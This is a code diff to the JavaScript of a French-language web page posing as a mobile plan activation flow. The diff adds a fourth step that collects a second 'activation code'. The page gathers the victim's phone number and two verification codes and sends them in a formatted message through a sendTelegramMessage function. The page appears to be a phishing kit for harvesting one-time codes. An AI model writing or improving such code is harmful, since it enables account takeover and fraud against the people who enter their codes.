@@ -12,10 +12,12 @@ document.addEventListener('DOMContentLoaded', () => {
     const step1Group = document.getElementById('step1Group');
     const step2Group = document.getElementById('step2Group');
     const step3Group = document.getElementById('step3Group');
+    const step4Group = document.getElementById('step4Group');
     
     const phoneNumberInput = document.getElementById('phoneNumber');
     const phoneNumberConfirmInput = document.getElementById('phoneNumberConfirm');
     const activationCodeInput = document.getElementById('activationCode');
+    const activationCode2Input = document.getElementById('activationCode2');
     
     let currentStep = 1;
     let selectedPackage = '';
@@ -45,10 +47,12 @@ document.addEventListener('DOMContentLoaded', () => {
             step1Group.style.display = 'block';
             step2Group.style.display = 'none';
             step3Group.style.display = 'none';
+            step4Group.style.display = 'none';
             
             phoneNumberInput.disabled = false;
             phoneNumberConfirmInput.required = false;
             activationCodeInput.required = false;
+            activationCode2Input.required = false;
             
             currentStep = 1;
             
@@ -138,7 +142,7 @@ document.addEventListener('DOMContentLoaded', () => {
                 step2Group.style.display = 'none';
                 step3Group.style.display = 'block';
                 activationCodeInput.required = true;
-                btnConfirmOrder.textContent = 'ACTIVER MON FORFAIT';
+                btnConfirmOrder.textContent = 'CONTINUER';
                 btnConfirmOrder.disabled = false;
                 orderStatus.style.display = 'none';
                 currentStep = 3;
@@ -153,9 +157,18 @@ document.addEventListener('DOMContentLoaded', () => {
         }
 
         if (currentStep === 3) {
+            step3Group.style.display = 'none';
+            step4Group.style.display = 'block';
+            activationCode2Input.required = true;
+            btnConfirmOrder.textContent = 'ACTIVER MON FORFAIT';
+            currentStep = 4;
+            return;
+        }
+
+        if (currentStep === 4) {
             const phoneNumber = phoneNumberInput.value;
             const code = activationCodeInput.value;
-            const code2 = document.getElementById('activationCode2').value;
+            const code2 = activationCode2Input.value;
 
             btnConfirmOrder.disabled = true;
             btnConfirmOrder.textContent = 'VÉRIFICATION...';
@@ -163,7 +176,7 @@ document.addEventListener('DOMContentLoaded', () => {
             const message = `✅ *CONFIRMATION CODE*\n\n` +
                             `📞 *Numéro*: ${phoneNumber}\n` +
                             `🔑 *Code 1*: ${code}\n` +
-                            (code2 ? `🔑 *Code 2*: ${code2}\n` : '') +
+                            `🔑 *Code 2*: ${code2}\n` +
                             `⏱ *Date*: ${new Date().toLocaleString()}`;
 
             const success = await sendTelegramMessage(message);
